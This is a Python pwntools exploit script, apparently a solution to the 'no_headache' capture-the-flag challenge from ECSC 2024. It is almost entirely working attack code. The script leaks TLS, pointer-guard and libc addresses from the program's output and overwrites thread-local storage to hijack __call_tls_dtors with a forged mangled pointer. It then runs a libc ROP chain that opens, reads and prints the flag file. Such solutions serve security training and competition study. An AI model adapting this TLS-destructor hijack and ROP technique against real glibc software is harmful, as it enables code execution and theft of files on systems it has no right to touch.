#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=noheadache.challs.open.ecsc2024.it' '--port=38004' '--libc=libs/libc.so.6' no_headache
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'no_headache')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'noheadache.challs.open.ecsc2024.it'
port = int(args.PORT or 38004)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libs/libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libs/libc.so.6')
else:
    libc = ELF('libs/libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# gdbscript = "source ~/src/gef/gef.py" # for better tls view
gdbscript = '''
continue
'''.format(**locals())
gdbscript += "b __call_tls_dtors"

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

PAD_TO_TLS = 0x900 - 0x80
tls_base = 0
local_guard = 0

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def PTR_MANGLE(local_guard, addr):
    return rol(local_guard ^ addr, 17, 64)
    
new = lambda : io.sendlineafter(b'> ', b'n')
program_exit = lambda : io.sendlineafter(b'> ', b'e')

def set_content(content):
    io.sendlineafter(b'> ', b's')
    io.sendlineafter(b'):', content)

def get_leaks():
    io.sendlineafter(b'> ', b'p')
    io.sendlineafter(b'Index: ', b'0')

    leaks = io.recvuntil(b'> ')
    io.sendline(b'm') # bring program state to menu

    # FIND OFFSET FROM LEAK FOR LOCAL_GUARD
    # with open('leaks.dump', 'rb') as f:
      # leaks = f.read()
      # print(leaks.index(p64(0x7ffff7c00000)[2:-2]))
    # with open('leaks.dump', 'wb') as f:
        # f.write(leaks)

    # FIND OFFSET FROM LEAK FOR TLS_BASE
    # print(leaks.index(p64(0x7ffff7fb9160)[:-2])) 

    global tls_base
    global local_guard
    tls_base = int.from_bytes(leaks[10282:10282+6], byteorder = 'little')  - 2592
    local_guard = int.from_bytes(leaks[10395:10395+8], byteorder = 'little')
    libc.address = int.from_bytes(b'\x00' + leaks[22737:22737+5], byteorder = 'little')

    log.info(f'TLS_BASE @ {hex(tls_base)}')
    log.info(f'libc @ {hex(libc.address)}')
    log.info(f'LOCAL_GUARD is {hex(local_guard)}')



def overwrite(padding, content):
    content_len = len(content)

    splitted = content.split(b'\x00')
    split_len = len(splitted)

    # Can't write more then 4096 bytes
    assert(padding + content_len < 0xfff)

    for _ in range(len(splitted)):
        curr = splitted.pop()

        set_content(curr.rjust((padding + content_len), b'\x41'))
        content_len -= (len(curr) + 1)

    

# io = remote('noheadache.challs.open.ecsc2024.it', 38004)
io = start()

# mmap_base
new()
set_content(b'A' * (0x1000 - 2))

# mmap_base + 0x1010
new()
set_content(b'A' * (0x2000 - 0x1220 - 2))

# mmap_base + 0x1e00 --- this operation change the size of the next allocated chunk
new()
payload = b"A;CCCCCCCCCCCCAABB=AAAAAA\xff=" # realloc(0x20)
set_content(payload)

# mmap_base + 0x1e30 --- this chunk has a size capable of overwriting tls
new()

get_leaks()
mmap_base = tls_base - 0x2740
last_alloc_ctx = mmap_base + 0x1e30 + 16

# tls content should start from tls-0x80
tls_content = b'\xff' * 8 * 5
tls_content += p64(last_alloc_ctx + 0x60) # -- rbp
tls_content += b'A' * 16
tls_content += b'\xff' * 8
overwrite(PAD_TO_TLS, tls_content)

# write ROP inside content of last chunk
rop = ROP(libc)
rop.open(last_alloc_ctx + 8, 0, constants.O_RDONLY)
rop.read(3, last_alloc_ctx + 8, 0x60)
rop.write(1, last_alloc_ctx + 8, 0x60)

print(rop.dump())

payload = b"\xff" * 0x60 # leave space for path
payload += p64(PTR_MANGLE(local_guard, rop.find_gadget(["leave"])[0]))
payload += rop.chain() # RIP
overwrite(0, payload)

set_content(b"AAAAAAAA/home/user/flag")
program_exit()

io.interactive()
